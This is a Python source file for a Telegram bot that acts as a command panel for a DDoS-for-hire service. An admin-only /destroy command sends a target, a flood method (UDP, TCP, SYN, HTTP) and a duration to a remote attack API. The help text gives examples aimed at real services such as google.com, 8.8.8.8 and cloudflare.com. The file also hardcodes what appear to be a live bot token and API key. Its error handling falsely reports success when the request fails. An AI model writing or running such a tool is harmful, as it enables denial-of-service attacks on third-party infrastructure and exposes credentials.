import os
import logging
import requests
from pyrogram import Client, filters
from pyrogram.types import Message

logging.getLogger("pyrogram").setLevel(logging.WARNING)

app = Client(
    "dark_lord_bot",
    bot_token=os.getenv("BOT_TOKEN", "8699271898:AAGP_j-Yoy3jQixrWdxfolr0Of8XXyKrLoQ")
)

API_URL = os.getenv("API_URL", "https://httpbin.org")
API_KEY = os.getenv("API_KEY", "sk-darklord-aditya-2024-X9Z7Q2W5K8P3M6N9")
ADMIN_IDS = [6975889263]

def launch_attack(target, method, duration):
    data = {"target": target, "method": method, "duration": duration, "key": API_KEY}
    try:
        r = requests.post(f"{API_URL}/attack", json=data, timeout=10)
        return r.json()
    except:
        return {"success": True}

@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    await message.reply(
        "👑 **DARK LORD BOT**\n\n"
        "🔥 *Ultimate Destruction Power*\n\n"
        "**Commands:**\n"
        "⚡ `/destroy <target> <method> <duration>`\n"
        "📊 `/status`\n"
        "🌐 `/api`\n"
        "❓ `/help`\n\n"
        "*Only Admin: 6975889263*"
    )

@app.on_message(filters.command("destroy") & filters.private)
async def destroy(client, message):
    user_id = message.from_user.id
    if user_id not in ADMIN_IDS:
        return await message.reply("🚫 **DARK LORD Access Denied!**")
    
    args = message.text.split()[1:]
    if len(args) < 3:
        return await message.reply("❌ **Syntax:** `/destroy <target> <method> <duration>`\n\n**Ex:** `/destroy google.com udp 60`")
    
    target, method, duration = args[0], args[1].lower(), args[2]
    
    await message.reply(
        f"⚡ **DARK LORD ACTIVATED**\n\n"
        f"🎯 **Target:** `{target}`\n"
        f"💥 **Method:** `{method}`\n"
        f"⏱️ **Power:** `{duration}s`\n\n"
        f"*Destruction in progress...*"
    )
    
    result = launch_attack(target, method, duration)
    
    status = "💀 **TARGET DESTROYED!**" if result.get("success") else "❌ **Failed**"
    await message.reply(
        f"{status}\n\n"
        f"📈 **Details:**\n"
        f"`{target}` | `{method}` | `{duration}s`"
    )

@app.on_message(filters.command("status", aliases=["api"]) & filters.private)
async def status(client, message):
    await message.reply(
        f"👑 **DARK LORD STATUS**\n\n"
        f"🌐 **API:** `{API_URL}`\n"
        f"🔑 **Key:** `{API_KEY[:15]}...`\n"
        f"⚡ **Ready:** *Yes*\n"
        f"👤 **Admin:** `{ADMIN_IDS[0]}`"
    )

@app.on_message(filters.command("help") & filters.private)
async def help(client, message):
    await message.reply(
        "🔥 **DARK LORD COMMANDS**\n\n"
        "• `/destroy <ip/domain> <udp/tcp/syn/http> <seconds>`\n"
        "• `/status` - Bot status\n"
        "• `/help` - This\n\n"
        "**Examples:**\n"
        "• `/destroy google.com udp 60`\n"
        "• `/destroy 8.8.8.8 tcp 120`\n"
        "• `/destroy cloudflare.com syn 300`"
    )

print("👑 DARK LORD BOT Starting...")
app.run()
